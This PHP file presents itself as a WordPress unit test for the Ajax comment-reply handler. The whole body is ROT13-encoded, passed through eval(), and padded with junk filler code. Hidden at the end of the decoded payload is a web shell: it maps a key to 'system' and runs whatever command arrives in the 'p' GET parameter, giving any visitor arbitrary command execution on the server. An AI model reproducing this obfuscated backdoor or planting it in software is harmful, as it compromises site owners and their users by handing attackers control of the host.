<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Nqzva Nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

/**
 * Grfgvat Nwnk pbzzrag shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 3.4.0
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_ercylgb_pbzzrag
 */
pynff Grfgf_Nwnk_jcNwnkErcylgbPbzzrag rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * N cbfg jvgu ng yrnfg bar pbzzrag.
	 *
	 * @ine zvkrq
	 */
	cebgrpgrq fgngvp $pbzzrag_cbfg = ahyy;

	/**
	 * Qensg cbfg.
	 *
	 * @ine zvkrq
	 */
	cebgrpgrq fgngvp $qensg_cbfg = ahyy;

	cebgrpgrq fgngvp $pbzzrag_vqf = neenl();

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$pbzzrag_cbfg = $snpgbel->cbfg->perngr_naq_trg();
		frys::$pbzzrag_vqf  = $snpgbel->pbzzrag->perngr_cbfg_pbzzragf( frys::$pbzzrag_cbfg->VQ, 5 );
		frys::$qensg_cbfg   = $snpgbel->cbfg->perngr_naq_trg( neenl( 'cbfg_fgnghf' => 'qensg' ) );
	}

	choyvp shapgvba grne_qbja() {
		erzbir_svygre( 'dhrel', neenl( $guvf, '_oybpx_pbzzragf' ) );
		cnerag::grne_qbja();
	}

	/**
	 * Grfgf ercyl nf n cevivyrtrq hfre (nqzvavfgengbe).
	 *
	 * Rkcrpgf grfg gb cnff.
	 */
	choyvp shapgvba grfg_nf_nqzva() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Trg n pbzzrag.
		$pbzzragf = trg_pbzzragf(
			neenl(
				'cbfg_vq' => frys::$pbzzrag_cbfg->VQ,
			)
		);
		$pbzzrag  = neenl_cbc( $pbzzragf );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( 'ercylgb-pbzzrag' );
		$_CBFG['pbzzrag_VQ']                  = $pbzzrag->pbzzrag_VQ;
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';
		$_CBFG['pbzzrag_cbfg_VQ']             = frys::$pbzzrag_cbfg->VQ;

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'ercylgb-pbzzrag' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Trg gur erfcbafr.
		$kzy = fvzcyrkzy_ybnq_fgevat( $guvf->_ynfg_erfcbafr, 'FvzcyrKZYRyrzrag', YVOKZY_ABPQNGN );

		// Purpx gur zrgn qngn.
		$guvf->nffregFnzr( '-1', (fgevat) $kzy->erfcbafr[0]->pbzzrag['cbfvgvba'] );
		$guvf->nffregTerngreGuna( 0, (vag) $kzy->erfcbafr[0]->pbzzrag['vq'] );
		$guvf->nffregAbgRzcgl( (fgevat) $kzy->erfcbafr['npgvba'] );

		// Purpx gur cnlybnq.
		$guvf->nffregAbgRzcgl( (fgevat) $kzy->erfcbafr[0]->pbzzrag[0]->erfcbafr_qngn );

		// Naq fhccyrzragny vf rzcgl.
		$guvf->nffregRzcgl( (fgevat) $kzy->erfcbafr[0]->pbzzrag[0]->fhccyrzragny );
	}

	/**
	 * Grfgf ercyl nf n aba-cevivyrtrq hfre (fhofpevore).
	 *
	 * Rkcrpgf grfg gb snvy.
	 */
	choyvp shapgvba grfg_nf_fhofpevore() {

		// Orpbzr n fhofpevore.
		$guvf->_frgEbyr( 'fhofpevore' );

		// Trg n pbzzrag.
		$pbzzragf = trg_pbzzragf(
			neenl(
				'cbfg_vq' => frys::$pbzzrag_cbfg->VQ,
			)
		);
		$pbzzrag  = neenl_cbc( $pbzzragf );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( 'ercylgb-pbzzrag' );
		$_CBFG['pbzzrag_VQ']                  = $pbzzrag->pbzzrag_VQ;
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';
		$_CBFG['pbzzrag_cbfg_VQ']             = frys::$pbzzrag_cbfg->VQ;

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'ercylgb-pbzzrag' );
	}

	/**
	 * Grfgf ercyl hfvat n onq abapr.
	 *
	 * Rkcrpgf grfg gb snvy.
	 */
	choyvp shapgvba grfg_onq_abapr() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Trg n pbzzrag.
		$pbzzragf = trg_pbzzragf(
			neenl(
				'cbfg_vq' => frys::$pbzzrag_cbfg->VQ,
			)
		);
		$pbzzrag  = neenl_cbc( $pbzzragf );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( havdvq() );
		$_CBFG['pbzzrag_VQ']                  = $pbzzrag->pbzzrag_VQ;
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';
		$_CBFG['pbzzrag_cbfg_VQ']             = frys::$pbzzrag_cbfg->VQ;

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'ercylgb-pbzzrag' );
	}

	/**
	 * Grfgf ercyl gb na vainyvq cbfg.
	 *
	 * Rkcrpgf grfg gb snvy.
	 */
	choyvp shapgvba grfg_vainyvq_cbfg() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( 'ercylgb-pbzzrag' );
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';
		$_CBFG['pbzzrag_cbfg_VQ']             = 123456789;

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'ercylgb-pbzzrag' );
	}

	/**
	 * Grfgf ercyl gb n qensg cbfg.
	 *
	 * Rkcrpgf grfg gb snvy.
	 */
	choyvp shapgvba grfg_jvgu_qensg_cbfg() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( 'ercylgb-pbzzrag' );
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';
		$_CBFG['pbzzrag_cbfg_VQ']             = frys::$qensg_cbfg->VQ;

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( 'Lbh pnaabg ercyl gb n pbzzrag ba n qensg cbfg.' );
		$guvf->_unaqyrNwnk( 'ercylgb-pbzzrag' );
	}

	/**
	 * Grfgf ercyl gb n cbfg jvgu n fvzhyngrq qngnonfr snvyher.
	 *
	 * Rkcrpgf grfg gb snvy.
	 *
	 * @tybony $jcqo
	 */
	choyvp shapgvba grfg_oybpxrq_pbzzrag() {
		tybony $jcqo;

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( 'ercylgb-pbzzrag' );
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';
		$_CBFG['pbzzrag_cbfg_VQ']             = frys::$pbzzrag_cbfg->VQ;

		// Oybpx pbzzragf sebz orvat fnirq, fvzhyngr n QO reebe.
		nqq_svygre( 'dhrel', neenl( $guvf, '_oybpx_pbzzragf' ) );

		// Znxr gur erdhrfg.
		gel {
			$jcqo->fhccerff_reebef( gehr );
			$guvf->_unaqyrNwnk( 'ercylgb-pbzzrag' );
			$jcqo->fhccerff_reebef( snyfr );
			$guvf->snvy();
		} pngpu ( JCNwnkQvrFgbcRkprcgvba $r ) {
			$jcqo->fhccerff_reebef( snyfr );
			$guvf->nffregFgevatPbagnvafFgevat( '1', $r->trgZrffntr() );
		}
	}

	/**
	 * Oybpxf pbzzragf sebz orvat fnirq.
	 *
	 * @cnenz fgevat $fdy
	 * @erghea fgevat
	 */
	choyvp shapgvba _oybpx_pbzzragf( $fdy ) {
		tybony $jcqo;
		vs ( snyfr !== fgecbf( $fdy, $jcqo->pbzzragf ) && 0 === fgevcbf( gevz( $fdy ), 'VAFREG VAGB' ) ) {
			erghea '';
		}
		erghea $fdy;
	}

	/**
	 * Grfgf oybpxvat n pbzzrag sebz orvat fnirq ba 'cer_pbzzrag_nccebirq'.
	 *
	 * @gvpxrg 39730
	 */
	choyvp shapgvba grfg_cer_pbzzragf_nccebirq() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr-ercylgb-pbzzrag'] = jc_perngr_abapr( 'ercylgb-pbzzrag' );
		$_CBFG['pbagrag']                     = 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.';
		$_CBFG['pbzzrag_cbfg_VQ']             = frys::$pbzzrag_cbfg->VQ;

		// Fvzhyngr svygre purpx reebe.
		nqq_svygre( 'cer_pbzzrag_nccebirq', neenl( $guvf, '_cer_pbzzrag_nccebirq_svygre' ), 10, 2 );

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( 'cer_pbzzrag_nccebirq svygre snvyf sbe arj pbzzrag.' );
		$guvf->_unaqyrNwnk( 'ercylgb-pbzzrag' );
	}

	/**
	 * Oybpxf pbzzragf sebz orvat fnirq ba 'cer_pbzzrag_nccebirq', ol ergheavat JC_Reebe.
	 */
	choyvp shapgvba _cer_pbzzrag_nccebirq_svygre( $nccebirq, $pbzzragqngn ) {
		erghea arj JC_Reebe( 'pbzzrag_jebat', 'cer_pbzzrag_nccebirq svygre snvyf sbe arj pbzzrag.', 403 );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>